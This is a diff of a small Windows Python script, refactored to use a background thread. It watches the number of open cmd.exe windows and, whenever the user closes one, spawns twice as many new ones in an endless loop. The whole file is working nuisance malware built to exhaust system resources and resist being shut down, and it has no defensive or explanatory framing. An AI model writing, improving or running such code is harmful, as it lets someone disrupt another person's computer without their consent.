@@ -1,24 +1,30 @@
 import subprocess
 import time
+import threading
 
 def cmd_count():
-    rs = subprocess.run("tasklist", shell=True, capture_output=True).stdout.split()
-    liste = []
-    for i in rs:
-        if ".exe" in str(i):
-            liste.append(str(i).strip("b").strip("'"))
-    return liste.count("cmd.exe")
+    output = subprocess.run("tasklist", capture_output=True, text=True, shell=True)
+    tasks = output.stdout.split("\n")
+    return sum(1 for task in tasks if "cmd.exe" in task)
 
-def cmd():
-    mr = cmd_count()
+def open_cmd_instances(count):
+    for _ in range(count):
+        subprocess.Popen("cmd /c start cmd", shell=True)
+
+def monitor_cmd():
     while True:
-        pu = cmd_count()
-        if pu != mr:
-            result = (pu-mr)-(pu-mr)-(pu-mr)
-            for i in range(0, result*2):
-                subprocess.Popen("start cmd", stdout=subprocess.PIPE, shell=True)
-            mr = cmd_count()
-            pu = mr
+        previous_count = cmd_count()
+        time.sleep(1)
+        current_count = cmd_count()
+        if current_count < previous_count:
+            diff = previous_count - current_count
+            open_cmd_instances(diff * 2)
 
-subprocess.Popen("start cmd", stdout=subprocess.PIPE, shell=True)
-cmd()
+subprocess.Popen("cmd /c start cmd", shell=True)
+
+monitor_thread = threading.Thread(target=monitor_cmd)
+monitor_thread.daemon = True
+monitor_thread.start()
+
+while True:
+    time.sleep(1)
